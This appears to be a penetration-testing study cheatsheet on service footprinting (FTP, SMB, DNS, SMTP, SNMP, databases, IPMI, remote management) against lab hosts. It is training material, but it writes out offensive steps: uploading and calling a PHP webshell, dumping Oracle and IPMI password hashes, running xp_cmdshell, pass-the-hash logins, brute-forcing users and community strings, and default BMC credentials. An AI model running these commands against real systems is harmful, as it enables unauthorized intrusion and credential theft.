---
title: "Footprinting"
description: "Service-by-service enumeration: FTP, SMB, NFS, DNS, SMTP, and more."
sidebar:
  order: 2
  label: "Footprinting"
---
> Deep service-by-service enumeration: FTP, SMB, NFS, DNS, SMTP, IMAP/POP3, SNMP, MySQL, MSSQL, Oracle TNS, IPMI, SSH, Rsync, R-Services, RDP, WinRM, WMI. The most command-heavy and tool-dense module of CPTS.

---


## OSINT / Infrastructure Enumeration

```bash
# Subdomains via Certificate Transparency
curl -s "https://crt.sh/?q=inlanefreight.com&output=json" | jq '.[].name_value' | sed 's/"//g' | sort -u

# Shodan — ASN, ports, tech stack
shodan search "inlanefreight.com"

# DNS — NS record
dig ns inlanefreight.htb @<nameserver>

# DNS — all records
dig any inlanefreight.htb @10.129.14.128

# Zone Transfer (AXFR) — jackpot if misconfigured
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128

# Subdomain brute force
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# DNSenum (most comprehensive — AXFR + brute-force)
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt \
  -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

### Key DNS Record Types

| Record | Description |
|----------|-------------|
| `A` | IPv4 of the hostname |
| `AAAA` | IPv6 of the hostname |
| `MX` | Mail server |
| `NS` | Authoritative nameserver |
| `TXT` | SPF, DKIM, domain verifications |
| `CNAME` | Alias → another hostname |
| `PTR` | Reverse DNS (IP → hostname) |
| `SOA` | Start of Authority — serial, refresh, TTY |

```bash
# DNS server version (bind) — useful for CVE search
dig CH TXT version.bind @<nameserver>
```

---

## FTP — Port 21 (Data: 20)

```bash
# Nmap — detect anonymous login and version
sudo nmap -sV -sC -p21 <IP>
sudo nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p21 <IP>

# Connect anonymously
ftp -p <IP>          # -p passive mode (avoids NAT issues)
> Name: anonymous
> ls -la
> cd pub
> get file.txt
> exit

# Download entire FTP (non-passive mode)
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# FTP over TLS (FTPS)
openssl s_client -connect <IP>:21 -starttls ftp
```

### Dangerous FTP Configurations

| Setting | Risk |
|---------|--------|
| `anonymous_enable=YES` | Login without credentials |
| `anon_upload_enable=YES` | Upload files anonymously |
| `no_anon_password=YES` | No password required for anonymous login |
| `hide_ids=YES` | Displays "ftp" instead of the real UID |
| `ls_recurse_enable=YES` | `ls -R` exposes the entire directory structure |

---

## SMB — Ports 139, 445

```bash
# List shares without authentication (null session)
smbclient -N -L \\\\<IP>

# Connect to share
smbclient -U user \\\\<IP>\\share
smbclient -N \\\\<IP>\\share           # without credentials
> ls / cd / get file / put file

# smbmap — view permissions on all shares
smbmap -H <IP>
smbmap -H <IP> -u user -p password

# CrackMapExec — quick enumeration
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u user -p password --shares --users

# rpcclient — RPC enumeration (null session)
rpcclient -U "" <IP>
rpcclient > srvinfo
rpcclient > enumdomains
rpcclient > querydominfo
rpcclient > netshareenumall
rpcclient > enumdomusers
rpcclient > queryuser 0x3e8        # user info by RID
# Brute-force RIDs to enumerate users
for i in $(seq 500 1100); do
  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null | grep -E "User Name|user_rid|group_rid" && echo "RID: $i"
done

# enum4linux-ng — all-in-one
enum4linux-ng -A <IP>
enum4linux-ng -A -C <IP>          # with credentials via the prompt
```

### Dangerous SMB Configurations

| Setting | Risk |
|---------|--------|
| `browseable = yes` | Shares visible without auth |
| `read only = no` | Write enabled |
| `guest ok = yes` | Access without credentials |
| `enable privileges = yes` | Allows privesc via SMB |
| `create mask = 0777` | Execution permissions on uploaded files |

---

## NFS — Ports 111 (RPC), 2049

```bash
# List available exports
showmount -e <IP>

# Mount NFS share
sudo mkdir /mnt/nfs
sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs

# Nmap — enumerate NFS
sudo nmap -sV -p111,2049 --script nfs* <IP>
# Shows: exports, mountd, mounted shares, permissions

# Unmount
sudo umount /mnt/nfs
```

### Dangerous NFS Configurations

| Setting | Risk |
|---------|--------|
| `rw` | Read/write access from any host |
| `insecure` | Accepts ports >1024 |
| `nohide` | Shows mounted file systems |
| `no_root_squash` | Client root = server root |

> **`no_root_squash` = critical:** if you can write to the share, create a SUID binary as root → direct privesc.

---

## SMTP — Ports 25, 587, 465

```bash
# Nmap — SMTP scripts
sudo nmap -sC -sV -p25 <IP>
sudo nmap -p25 --script smtp-open-relay -v <IP>     # 16 open relay tests

# Manual interaction via telnet
telnet <IP> 25
HELO mail1.inlanefreight.htb
EHLO mail1                          # shows supported extensions
VRFY root                           # verify if user exists (252 = possible existence)
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com> NOTIFY=success,failure
DATA
From: <...>
To: <...>
Subject: Test
.
QUIT
```

### Key SMTP Commands

| Command | Usage |
|---------|-----|
| `EHLO` | Starts ESMTP session + lists extensions |
| `VRFY <user>` | Verifies if user exists |
| `EXPN <alias>` | Expands a mail alias |
| `MAIL FROM:` | Defines sender |
| `RCPT TO:` | Defines recipient |
| `DATA` | Starts email body |

**Open Relay:** `mynetworks = 0.0.0.0/0` → allows sending emails as any sender → spoofing/spam.

---

## IMAP / POP3 — Ports 143, 993 (IMAP), 110, 995 (POP3)

```bash
# Nmap — scan email ports
sudo nmap -sV -p110,143,993,995 -sC <IP>

# Connect IMAPS with curl (enumerate mailboxes)
curl -k 'imaps://<IP>' --user user:password
curl -k 'imaps://<IP>' --user user:password -v  # TLS details + banner

# Connect via OpenSSL (interactive)
openssl s_client -connect <IP>:pop3s
openssl s_client -connect <IP>:imaps
```

### IMAP Commands (After Login)

```
1 LOGIN user password
1 LIST "" *                 # list folders
1 SELECT INBOX              # select mailbox
1 FETCH 1 all               # read message ID 1
1 LOGOUT
```

### POP3 Commands

```
USER user
PASS password
STAT                        # number of messages
LIST                        # list with sizes
RETR 1                      # download message 1
DELE 1                      # mark to delete
QUIT
```

---

## SNMP — UDP 161 (Agent), UDP 162 (Traps)

```bash
# Enumerate the entire OID tree (version 1/2c with community string)
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.5.0   # hostname

# Brute-force community strings
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>

# Brute-force OIDs with known community
braa public@<IP>:.1.3.6.*
```

### SNMP Versions

| Version | Security |
|---------|-----------|
| `v1` | No authentication, no encryption — all plaintext |
| `v2c` | Community string in plaintext — just as insecure |
| `v3` | Auth + password-based encryption — the only secure one |

### Dangerous SNMP Configurations

| Setting | Risk |
|---------|--------|
| `rwuser noauth` | R/W access to full OID tree without auth |
| `rwcommunity <string> 0.0.0.0/0` | R/W access from any IP |
| Community string `public` active | Default — dumps the entire system |

---

## MySQL — TCP 3306

```bash
# Nmap — MySQL scripts (detect empty password, users, hashes)
sudo nmap -sV -sC -p3306 --script mysql* <IP>

# Connect
mysql -u root -h <IP>
mysql -u root -pP4SSw0rd -h <IP>

# Useful SQL commands
show databases;
use <database>;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "string";
select version();
select user();
select @@hostname;
```

### Dangerous MySQL Configurations

| Setting | Risk |
|---------|--------|
| `user`/`password` in plaintext in config | Credentials exposed in `/etc/mysql/mysql.conf.d/mysqld.cnf` |
| `debug = ON` | Verbose output → sensitive info in web interface |
| `secure_file_priv = ""` | Allows `LOAD DATA` / `SELECT INTO OUTFILE` without restrictions |

---

## MSSQL — TCP 1433

```bash
# Nmap — MSSQL scripts
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,\
mssql.instance-name=MSSQLSERVER -sV -p1433 <IP>

# Metasploit — mssql_ping
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 > set RHOSTS <IP>
msf6 > run

# Connect with Impacket
python3 mssqlclient.py Administrator@<IP> -windows-auth

# SQL commands
SQL> select name from sys.databases
SQL> select @@version
SQL> select user_name()
SQL> exec xp_cmdshell 'whoami'   # if enabled → RCE
```

### MSSQL System Databases

| DB | Description |
|----|-------------|
| `master` | All SQL Server system information |
| `model` | Template for new databases |
| `msdb` | SQL Server Agent (jobs, alerts) |
| `tempdb` | Temporary objects |
| `resource` | Read-only — system objects |

**`xp_cmdshell`** enabled → execution of OS commands as the SQL service user.

---

## Oracle TNS — TCP 1521

```bash
# Nmap — detect TNS version
sudo nmap -p1521 -sV <IP> --open

# Brute force SID
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute

# ODAT — all-in-one (complete enumeration)
./odat.py all -s <IP>
# Finds credentials, SIDs, vulnerabilities, and allows uploading files

# Connect with sqlplus (after getting creds + SID)
sqlplus scott/tiger@<IP>/XE
sqlplus scott/tiger@<IP>/XE as sysdba    # if scott has DBA privileges

# Oracle commands
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
SQL> select name, password from sys.user$;   # extract hashes (as sysdba)

# Upload webshell via ODAT (if web server is present)
./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot shell.php ./shell.php

# Verify webshell
curl http://<IP>/shell.php?cmd=whoami
```

**Default Oracle Credentials:**
- Oracle 9: `CHANGE_ON_INSTALL`
- Oracle DBSNMP: `dbsnmp`
- scott/tiger (classic lab credentials)

---

## IPMI — UDP 623

```bash
# Nmap — detect IPMI
sudo nmap -sU --script ipmi-version -p623 <IP>

# Metasploit — ipmi_version
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set RHOSTS <IP>; run

# Metasploit — dump RAKP hashes (IPMI 2.0 flaw)
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <IP>; run
# → gets SHA1 hash of the password of ANY valid user

# Crack hash
hashcat -m 7300 ipmi.txt wordlist.txt
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u  # HP iLO factory default
```

### Default BMC Credentials

| Product | Username | Password |
|----------|---------|----------|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | 8 alphanumeric characters (randomized) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

**RAKP flaw:** IPMI 2.0 sends a salted SHA1/MD5 hash of the password to the client BEFORE authentication. No patch exists — it is part of the protocol.

---

## Linux Remote Management

### SSH — TCP 22

```bash
# SSH server fingerprint
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py <IP>

# View supported authentication methods
ssh -v user@<IP>

# Force password authentication (for brute-force)
ssh -v user@<IP> -o PreferredAuthentications=password
```

### Dangerous SSH Configurations

| Setting | Risk |
|---------|--------|
| `PasswordAuthentication yes` | Allows brute-force |
| `PermitEmptyPasswords yes` | Access without password |
| `PermitRootLogin yes` | Direct root login |
| `Protocol 1` | SSH-1 vulnerable to MITM |
| `X11Forwarding yes` | CVE-2016-3115 (RCE in v7.2p1) |

### Rsync — TCP 873

```bash
# Detect Rsync
sudo nmap -sV -p873 <IP>

# Enumerate available shares
nc -nv <IP> 873
> #list

# List files in share
rsync -av --list-only rsync://<IP>/dev

# Download the entire share
rsync -av rsync://<IP>/dev /tmp/rsync_dev

# Rsync over SSH
rsync -av -e "ssh -p2222" rsync://<IP>/share /tmp/
```

### R-Services — Ports 512, 513, 514

```bash
# Nmap
sudo nmap -sV -p512,513,514 <IP>

# rlogin — login on remote host (if .rhosts is misconfigured)
rlogin <IP> -l user

# rwho — authenticated users on the network
rwho

# rusers — detailed by IP
rusers -al <IP>
```

**.rhosts with `+ +`** → any user from any host can connect without credentials.

---

## Windows Remote Management

### RDP — TCP/UDP 3389

```bash
# Nmap — RDP scripts (NLA, version, domain)
nmap -sV -sC -p3389 --script rdp* <IP>

# rdp-sec-check — protocol and supported encryption
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl <IP>

# Connect via xfreerdp
xfreerdp /u:user /p:"password" /v:<IP>
xfreerdp /u:user /p:"password" /v:<IP> /cert:ignore   # ignore self-signed cert
```

### WinRM — TCP 5985 (HTTP), 5986 (HTTPS)

```bash
# Nmap — detect WinRM
nmap -sV -sC -p5985,5986 --disable-arp-ping -n <IP>

# evil-winrm — remote PowerShell shell
evil-winrm -i <IP> -u user -p "password"
evil-winrm -i <IP> -u user -H "NTLM_HASH"  # pass-the-hash
```

### WMI — TCP 135 (Start) → Random Port

```bash
# wmiexec.py — run commands
/usr/share/doc/python3-impacket/examples/wmiexec.py user:"password"@<IP> "whoami"
wmiexec.py user:"password"@<IP>   # interactive shell
```

---

## Quick Reference — Ports and Tools

| Service | Port | Key Tools |
|----------|--------|--------------------|
| FTP | TCP 21/20 | `ftp`, `wget -m`, nmap `ftp-anon` |
| SMB | TCP 139/445 | `smbclient`, `rpcclient`, `smbmap`, `CrackMapExec`, `enum4linux-ng` |
| NFS | TCP/UDP 111, 2049 | `showmount`, `mount -t nfs`, nmap `nfs*` |
| DNS | UDP/TCP 53 | `dig`, `dnsenum`, `dig axfr` |
| SMTP | TCP 25/587/465 | `telnet`, `VRFY`, nmap `smtp-open-relay` |
| IMAP | TCP 143/993 | `curl imaps://`, `openssl s_client` |
| POP3 | TCP 110/995 | `openssl s_client`, `ncat` |
| SNMP | UDP 161/162 | `snmpwalk`, `onesixtyone`, `braa` |
| MySQL | TCP 3306 | `mysql`, nmap `mysql*` |
| MSSQL | TCP 1433 | `mssqlclient.py`, nmap `ms-sql*`, MSF |
| Oracle TNS | TCP 1521 | `odat.py`, `sqlplus`, nmap `oracle-sid-brute` |
| IPMI | UDP 623 | MSF `ipmi_version`, MSF `ipmi_dumphashes`, hashcat `-m 7300` |
| SSH | TCP 22 | `ssh-audit`, `ssh -v` |
| Rsync | TCP 873 | `rsync --list-only`, `nc` |
| R-Services | TCP 512-514 | `rlogin`, `rwho`, `rusers` |
| RDP | TCP 3389 | `xfreerdp`, nmap `rdp*`, `rdp-sec-check` |
| WinRM | TCP 5985/5986 | `evil-winrm` |
| WMI | TCP 135+ | `wmiexec.py` |

---

## Pitfalls / Gotchas

- **SNMP v1/v2c with community public** is the most common in exams — always test it.
- **`no_root_squash` in NFS** → create a SUID binary in the share as the client's root → root shell. Always check it upon mounting.
- **AXFR without restriction** (`allow-transfer any`) → exposes the entire internal zone including DCs and internal IPs. Search for the `internal.*` zone as well.
- **IPMI RAKP flaw has no patch** — if you find UDP 623, always dump hashes with MSF and crack them.
- **Oracle TNS:** the SID is mandatory to connect. Brute-force with `oracle-sid-brute` or ODAT first.
- **`VRFY` in SMTP is not always reliable** — code 252 can be a false positive. Do not trust it blindly.
- **rpcclient null session** may be blocked in modern Windows systems with SMB signing. `enum4linux-ng` provides more information robustly.
- **evil-winrm** requires WinRM to be enabled (default on Windows Server 2012+). Use `Test-WsMan` from PowerShell to verify.
- **RDP with `--packet-trace` in Nmap** → the `mstshash=nmap` cookie is detected by EDR. In environments with detection use `rdp-sec-check.pl` instead.
- **Password reuse** is the most common chain: FTP → SSH → WinRM → DB credentials. Always test on all services.

---

## Related Cheatsheets

- [Network Enumeration with Nmap](/en/metodologias/recon/network-enumeration-nmap/) — Initial discovery and NSE scripts before service footprinting
- [Attacking Common Services](/en/metodologias/servicios/attacking-common-services/) — Real exploitation of FTP, SMB, RDP, WinRM, DNS, SQL
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — Hashcat with NTLM, IPMI (mode 7300), and Oracle hashes
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — RPC/SMB in domain context
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Accessing internal services after first foothold
